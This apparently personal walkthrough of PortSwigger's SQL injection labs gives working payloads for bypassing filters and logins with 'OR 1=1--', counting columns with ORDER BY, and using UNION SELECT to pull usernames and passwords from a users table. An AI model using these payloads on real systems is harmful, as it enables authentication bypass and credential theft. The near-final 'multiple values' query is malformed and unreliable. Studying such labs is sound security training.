[Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

# Apprentice

## Showing all items, even unreleased ones

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
```

Website takes a category as input, and shows only the released products in that category.
Using SQL comments and a little logic, we can make it skip `AND released = 1` entirely:

The SQL query sent from the server should look like this:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1;
```

We can send this input to get the desired query that shows all products, even the unreleased ones:

Category input field: `Gifts' OR 1=1--`

## Log in as "administrator" without a password

Use the same logic to comment out the password parameter in the SQL query.

We can imagine that the SQL query sent from the server is something like this:
```sql
SELECT * FROM users WHERE username = 'someusername' AND password = 'somepassword';
```

The desired query:
```sql
SELECT * FROM users WHERE username = 'administrator' AND password = '' OR 1=1--';
```

To end up with the desired SQL query, this is what we need to type in the input fields:
Username: `administrator`
Password: `' OR 1=1--`

# Practitioner

## Figure out how many columns are in a table

Source: https://portswigger.net/web-security/sql-injection/union-attacks

I imagine the SQL query looks something like this by default:
```sql
SELECT * FROM products WHERE category = 'Accessories';
```

To figure out how many columns are in a table we can use either of these techniques.

**The first one uses in `ORDER BY` in an unintended way.**

The intended use of `ORDER BY` is to sort the returned data from an SQL query such as `SELECT * FROM products` ascendingly (ASC) or descendingly (DESC) by column N.

By running this SQL query:
```sql
SELECT * FROM products ORDER BY 2 ASC;
```
... we sort the products returned to us by column index 2 (not 3) in an ascending order.

You can also sort using a column name, such as:
```sql
SELECT * FROM products ORDER BY price DESC;
```

... however, in this case only the index is useful.

If the column index we are trying to order by is non existent, e.g. when a table has 3 columns and we try to order it based on column 5 which doesn't exist, we will be greeted with an error message of some kind.
We can use this to our advantage in this task. Let's check if we can order by the column indices 1-10, at which index does it fail?

There is no "input field" for this task, we must use something like Burpsuite or cURL to send a forged GET request to the server.

```
GET /filter?category=Accessories'+ORDER+BY+1--
```
> Works

```
GET /filter?category=Accessories'+ORDER+BY+2--
```
> Works

```
GET /filter?category=Accessories'+ORDER+BY+3--
```
> Works

```
GET /filter?category=Accessories'+ORDER+BY+4--
```
> Fails

Since it failed at sorting by the 4th column we can determine that there are only 3 columns in this table.

The same task may be done using `UNION SELECT`, like this:
```
GET /filter?category=Accessories'+UNION+SELECT+NULL--
```
> Works

```
GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL--
```
> Works

```
GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL,NULL--
```
> Works

```
GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL,NULL,NULL--
```
> Fails


## UNION attack, finding a column containing text

> Make the database retreive the string: 'hEAgeA'

First we use the technique from the previous task to determine how many columns there are in the table.

```yaml
# Works
GET /filter?category=Accessories'+ORDER+BY+3--

# Fails
GET /filter?category=Accessories'+ORDER+BY+4--
```

This means that there are still only 3 columns in the table.

Since we know what we are looking for, we can search for it using a `UNION SELECT`
Like this:

```yaml
# Fails
GET /filter?category=Accessories'+UNION+SELECT+'hEAgeA',NULL,NULL--

# Works - the task is solved
GET /filter?category=Accessories'+UNION+SELECT+NULL,'hEAgeA',NULL--

# Fails
GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL,'hEAgeA'--
```

With this we have figured out that only column no. 2 contains string values.
Looking at what it returns I suspect the columns to be: `ID`, `ProductName`, `Price`, although this is not directly relevant.

Since we tested each column for compatibility with strings using `hEAgeA`, the task was solved after the second attempt. 

## UNION attack, retrieving data from other tables

We are given information that another table `users` exist with the columns `username` and `password`.

To solve the challenge we need to fetch information (the password) about the `administrator` user.

We know that the number of columns in the `products` table is 3. `UNION SELECT`'s always need to return the same amount of columns as there are in the initial table. 

Using a simple `UNION SELECT username,password,NULL FROM users`, we may be able to retrieve information about all the users.

```yaml
/filter?category=Accessories'+UNION+SELECT+username,password,NULL+FROM+users--
```

This ended up not working. We should start from scratch by checking how many columns this table of products have:

```yaml
# Works
GET /filter?category=Accessories'+ORDER+BY+2--

# Fails
GET /filter?category=Accessories'+ORDER+BY+3--
```

There are only 2 columns in this table. Let's try fetching the credentials again, but this time only specifying 2 columns.

```yaml
/filter?category=Accessories'+UNION+SELECT+username,password+FROM+users--
```

This works. We can see the users' passwords and usernames. To solve the challenge we need to log in as the administrator.

## UNION attack, retrieving multiple values in a single column

There are 2 columns (found using `ORDER BY`).

```
(UNION SELECT username FROM user) UNION (UNION SELECT password FROM user)
```

## Querying database type and version (on Oracle)

Check cheatsheet
